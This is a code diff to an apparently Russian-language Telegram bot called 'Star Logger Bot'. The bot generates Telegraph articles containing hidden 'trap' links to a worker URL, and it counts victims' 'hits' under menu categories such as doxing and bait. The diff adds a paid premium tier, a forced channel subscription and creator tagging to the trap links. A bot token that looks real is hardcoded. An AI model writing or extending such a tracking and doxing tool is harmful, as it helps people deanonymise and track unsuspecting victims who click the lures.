@@ -4,6 +4,7 @@ import time
 import string
 import secrets
 import sqlite3
+import urllib.parse
 from datetime import datetime
 from dotenv import load_dotenv
 
@@ -16,9 +17,14 @@ load_dotenv()
 
 BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "9043148910:AAF_ewMZkG7fuIGF-xWfXdIVHeuQ0V-duM0"
 ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
-LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1003736442705")
+LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trap.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
+
+# --- НОВОЕ: Канал для подписки и поддержка ---
+CHANNEL_ID  = -1002429481146 # ID канала "Project" (ссылка +c3xyHely39ozNDyY)
+SUPPORT     = "@boyfrer"
+PREMIUM_PRICE = 5.0
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -38,6 +44,7 @@ def db_init():
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             user_id INTEGER UNIQUE,
             username TEXT,
+            is_premium INTEGER DEFAULT 0,
             created_at TEXT
         );
         CREATE TABLE IF NOT EXISTS balance (
@@ -62,6 +69,15 @@ def register(user_id, username):
         c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?,?,?)",
                   (user_id, username, datetime.now().isoformat()))
 
+def is_premium(user_id):
+    with _conn() as c:
+        r = c.execute("SELECT is_premium FROM users WHERE user_id=?", (user_id,)).fetchone()
+        return bool(r and r["is_premium"])
+
+def set_premium(user_id):
+    with _conn() as c:
+        c.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (user_id,))
+
 def get_balance(user_id):
     with _conn() as c:
         r = c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()
@@ -78,16 +94,17 @@ def user_counts():
     with _conn() as c:
         total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
         with_bal = c.execute("SELECT COUNT(*) FROM balance WHERE amount > 0").fetchone()[0]
-        return total, with_bal
+        premium = c.execute("SELECT COUNT(*) FROM users WHERE is_premium=1").fetchone()[0]
+        return total, with_bal, premium
 
 def all_user_ids():
     with _conn() as c:
         return [r["user_id"] for r in c.execute("SELECT user_id FROM users")]
 
-def get_all_users(limit=20):
+def get_all_users(limit=30):
     with _conn() as c:
         return c.execute("""
-            SELECT u.user_id, u.username, u.created_at, COALESCE(b.amount, 0) as balance
+            SELECT u.user_id, u.username, u.created_at, u.is_premium, COALESCE(b.amount, 0) as balance
             FROM users u
             LEFT JOIN balance b ON u.user_id = b.user_id
             ORDER BY u.created_at DESC LIMIT ?
@@ -113,6 +130,13 @@ def get_all_links(limit=20):
         """, (limit,)).fetchall()
 
 # ---------- UTIL ----------
+def check_sub(user_id):
+    try:
+        status = bot.get_chat_member(CHANNEL_ID, user_id).status
+        return status in ["member", "administrator", "creator"]
+    except Exception:
+        return False
+
 def send_log(text):
     try:
         bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
@@ -123,10 +147,13 @@ def slug_gen(n=8):
     a = string.ascii_letters + string.digits
     return "".join(secrets.choice(a) for _ in range(n))
 
-def make_trap_link(title, created_by):
+def make_trap_link(title, created_by, creator_username):
     slug = slug_gen()
     create_link(slug, title, created_by)
-    return f"{WORKER_URL}/t/{slug}", slug
+    q_title = urllib.parse.quote(title or "—")
+    q_user = urllib.parse.quote(creator_username or "—")
+    url = f"{WORKER_URL}/t/{slug}?t={q_title}&u={q_user}"
+    return url, slug
 
 def build_html(text, trap_url, img_url=None):
     parts = [f"<p>{text}</p>", f'<p><a href="{trap_url}">Продолжение тут</a></p>']
@@ -134,8 +161,8 @@ def build_html(text, trap_url, img_url=None):
         parts.append(f'<img src="{img_url}">')
     return "<br>".join(parts)
 
-def make_article(title, text, img_url, template_name, author_id):
-    trap_url, slug = make_trap_link(title, author_id)
+def make_article(title, text, img_url, template_name, author_id, author_username):
+    trap_url, slug = make_trap_link(title, author_id, author_username)
     html = build_html(text, trap_url, img_url)
     page = telegraph.create_page(title=title, html_content=html)
     url = f"https://telegra.ph/{page['path']}"
@@ -151,21 +178,21 @@ def make_article(title, text, img_url, template_name, author_id):
     return msg, url, slug
 
 # ---------- MENUS ----------
-def show_main_menu(message):
-    uid = message.chat.id
+def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url='https://t.me/+FfSgUJx-g4s0ZTE6'))
+    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url='https://t.me/+c3xyHely39ozNDYy'))
     kb.add(types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33'))
     kb.add(types.InlineKeyboardButton("📙Профиль", callback_data='cabinet'))
     kb.add(types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger'))
+    
+    prem = " 💎" if is_premium(uid) else ""
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(uid, had,
-            f'<b>⭐️Star Logger Bot!\n=============================\n'
+            f'<b>⭐️Star Logger Bot!{prem}\n=============================\n'
             f'⭐️Главное меню\n=============================\n'
             f'💰Баланс: {get_balance(uid):.2f}$\n'
             f'🆔 ID: {uid}</b>', reply_markup=kb)
 
-# ---------- ADMIN MENU ----------
 def admin_menu(chat_id):
     if chat_id not in ADMIN_IDS:
         bot.send_message(chat_id, "<b>❌Нет доступа.</b>")
@@ -180,6 +207,88 @@ def admin_menu(chat_id):
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(chat_id, had, caption='<b>⭐️Админ-меню</b>', reply_markup=kb)
 
+# ---------- START ----------
+@bot.message_handler(commands=['start'])
+def cmd_start(message):
+    uid = message.from_user.id
+    username = message.from_user.username or ""
+    if not is_registered(uid):
+        register(uid, username)
+        send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
+        
+    if not check_sub(uid):
+        kb = types.InlineKeyboardMarkup()
+        kb.add(types.InlineKeyboardButton("📢 Подписаться", url='https://t.me/+c3xyHely39ozNDYy'))
+        kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
+        bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на наш канал!</b>", reply_markup=kb)
+        return
+
+    show_main_menu(uid)
+
+@bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
+def cb_check_sub(call):
+    if check_sub(call.from_user.id):
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        show_main_menu(call.message.chat.id)
+    else:
+        bot.answer_callback_query(call.id, "❌ Ты ещё не подписался!", show_alert=True)
+
+# ---------- CALLBACKS ----------
+@bot.callback_query_handler(func=lambda c: c.data == 'home')
+def cb_home(call):
+    try: bot.delete_message(call.message.chat.id, call.message.message_id)
+    except Exception: pass
+    show_main_menu(call.message.chat.id)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
+def cb_cabinet(call):
+    uid = call.message.chat.id
+    links = get_user_links(uid)
+    total_hits = sum(l["hits"] for l in links)
+    prem = "💎 Premium" if is_premium(uid) else "Обычный"
+    lines = [
+        f"<b>⭐️Профиль</b>",
+        "=============================",
+        f"🆔 ID: <code>{uid}</code>",
+        f"📊 Статус: {prem}",
+        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
+        f"🔗 Линков: {len(links)}",
+        f"🎯 Хитов: {total_hits}",
+        "=============================",
+    ]
+    if not is_premium(uid):
+        lines.append(f"💎 Купить Premium за {PREMIUM_PRICE}$")
+
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
+    kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
+    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
+    try:
+        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id,
+                                 caption="\n".join(lines), reply_markup=kb)
+    except Exception:
+        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda c: c.data == 'buy_premium')
+def cb_buy_premium(call):
+    uid = call.from_user.id
+    if is_premium(uid):
+        bot.answer_callback_query(call.id, "✅ У тебя уже есть Premium!", show_alert=True)
+        return
+    
+    bal = get_balance(uid)
+    if bal < PREMIUM_PRICE:
+        bot.answer_callback_query(call.id, f"❌ Недостаточно средств!\nНужно: {PREMIUM_PRICE}$\nУ тебя: {bal:.2f}$", show_alert=True)
+        return
+
+    add_balance(uid, -PREMIUM_PRICE)
+    set_premium(uid)
+    bot.answer_callback_query(call.id, "💎 Premium успешно активирован!", show_alert=True)
+    cb_cabinet(call) # обновляем профиль
+
+# ---------- ADMIN ----------
 @bot.message_handler(commands=['admin'])
 def cmd_admin(m):
     admin_menu(m.chat.id)
@@ -212,10 +321,10 @@ def cb_admin_users(call):
     users = get_all_users(30)
     lines = ["<b>👥 Последние 30 юзеров:</b>"]
     for u in users:
-        lines.append(f"<code>{u['user_id']}</code> @{u['username'] or '-'} · {u['balance']:.2f}$")
+        prem = "💎" if u['is_premium'] else ""
+        lines.append(f"<code>{u['user_id']}</code> @{u['username'] or '-'} · {u['balance']:.2f}$ {prem}")
     text = "\n".join(lines)
-    if len(text) > 4000:
-        text = text[:3997] + "..."
+    if len(text) > 4000: text = text[:3997] + "..."
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              caption=text, reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back")))
@@ -228,8 +337,7 @@ def cb_admin_links(call):
     for l in links:
         lines.append(f"<code>{l['slug']}</code> · by @{l['username'] or l['created_by']} · {l['title'][:20]}")
     text = "\n".join(lines)
-    if len(text) > 4000:
-        text = text[:3997] + "..."
+    if len(text) > 4000: text = text[:3997] + "..."
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              caption=text, reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back")))
@@ -260,9 +368,9 @@ def _admin_bc_step(message):
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_stats' and c.from_user.id in ADMIN_IDS)
 def cb_admin_stats(call):
-    total, with_bal = user_counts()
+    total, with_bal, premium = user_counts()
     bot.send_message(call.message.chat.id,
-        f"<b>⭐️Star Logger Bot</b>\n👥Всего юзеров: {total}\n💰С балансом: {with_bal}")
+        f"<b>⭐️Star Logger Bot</b>\n👥Всего: {total}\n💰С балансом: {with_bal}\n💎Premium: {premium}")
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_dump' and c.from_user.id in ADMIN_IDS)
@@ -274,73 +382,13 @@ def cb_admin_dump(call):
         bot.send_message(call.message.chat.id, f"❌ {e}")
     bot.answer_callback_query(call.id)
 
-# ---------- START ----------
-@bot.message_handler(commands=['start'])
-def cmd_start(message):
-    uid = message.from_user.id
-    username = message.from_user.username or ""
-    first = not is_registered(uid)
-    if first:
-        register(uid, username)
-        send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
-
-    if first:
-        kb = types.InlineKeyboardMarkup()
-        kb.add(types.InlineKeyboardButton("✅ Продолжить", callback_data='continue'))
-        with open('had2.jpg', 'rb') as had:
-            bot.send_photo(uid, had,
-                '<b>💎Приветствуем в Star Logger Bot!</b>', reply_markup=kb)
-        return
-
-    show_main_menu(message)
-
-# ---------- CALLBACKS ----------
-@bot.callback_query_handler(func=lambda c: c.data == 'continue')
-def cb_continue(call):
-    try: bot.delete_message(call.message.chat.id, call.message.message_id)
-    except Exception: pass
-    show_main_menu(call.message)
-    bot.answer_callback_query(call.id)
-
-@bot.callback_query_handler(func=lambda c: c.data == 'home')
-def cb_home(call):
-    try: bot.delete_message(call.message.chat.id, call.message.message_id)
-    except Exception: pass
-    show_main_menu(call.message)
-    bot.answer_callback_query(call.id)
-
-@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
-def cb_cabinet(call):
-    uid = call.message.chat.id
-    links = get_user_links(uid)
-    total_hits = sum(l["hits"] for l in links)
-    lines = [
-        "<b>⭐️Star Logger Bot</b>",
-        "=============================",
-        f"🆔 ID: <code>{uid}</code>",
-        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
-        f"🔗 Линков: {len(links)}",
-        f"🎯 Хитов: {total_hits}",
-        "=============================",
-        "📙 Последние ссылки:",
-    ]
-    if not links:
-        lines.append("— пусто")
-    for l in links:
-        lines.append(f"<code>{l['slug']}</code> · {l['title'] or '—'}")
-    kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("📞 Пополнить (написать админу)", url="https://t.me/StarLoggerSupportbot"))
-    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
-    try:
-        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id,
-                                 caption="\n".join(lines), reply_markup=kb)
-    except Exception:
-        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
-    bot.answer_callback_query(call.id)
-
 # ---------- LOGGER ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'logger')
 def cb_logger(call):
+    if not check_sub(call.from_user.id):
+        bot.answer_callback_query(call.id, "❌ Подпишись на канал!", show_alert=True)
+        return
+
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton("📙Д0xing", callback_data="cat_dox"))
     kb.add(types.InlineKeyboardButton("📙Байты", callback_data="cat_bait"))
@@ -418,10 +466,10 @@ def _make_step(message):
     key, title = data
     img = None if message.text.strip() == "/skip" else message.text.strip()
     text = TEXTS[key].format(title=title)
-    msg, url, slug = make_article(title, text, img, TEMPLATES[key], message.from_user.id)
+    username = message.from_user.username or str(message.from_user.id)
+    msg, url, slug = make_article(title, text, img, TEMPLATES[key], message.from_user.id, username)
     bot.send_message(message.chat.id, msg)
-    send_log(f"🔔 {message.from_user.id}\n⭐️{TEMPLATES[key]}\n"
-             f"Тема: {title}\nЛовушка: <code>{WORKER_URL}/t/{slug}</code>\nСтатья: {url}")
+    send_log(f"🔔 {message.from_user.id}\n⭐️{TEMPLATES[key]}\nТема: {title}\nЛовушка: <code>{WORKER_URL}/t/{slug}</code>\nСтатья: {url}")
 
 @bot.callback_query_handler(func=lambda c: c.data == "tpl_custom")
 def cb_custom(call):
@@ -446,10 +494,10 @@ def _cust_img(message):
     if not d:
         return
     img = None if message.text.strip() == "/skip" else message.text.strip()
-    msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id)
+    username = message.from_user.username or str(message.from_user.id)
+    msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id, username)
     bot.send_message(message.chat.id, msg)
-    send_log(f"🔔 {message.from_user.id}\n⭐️custom\nТема: {d['title']}\n"
-             f"Ловушка: <code>{WORKER_URL}/t/{slug}</code>\nСтатья: {url}")
+    send_log(f"🔔 {message.from_user.id}\n⭐️custom\nТема: {d['title']}\nЛовушка: <code>{WORKER_URL}/t/{slug}</code>\nСтатья: {url}")
 
 # ---------- ENTRY ----------
 if __name__ == "__main__":
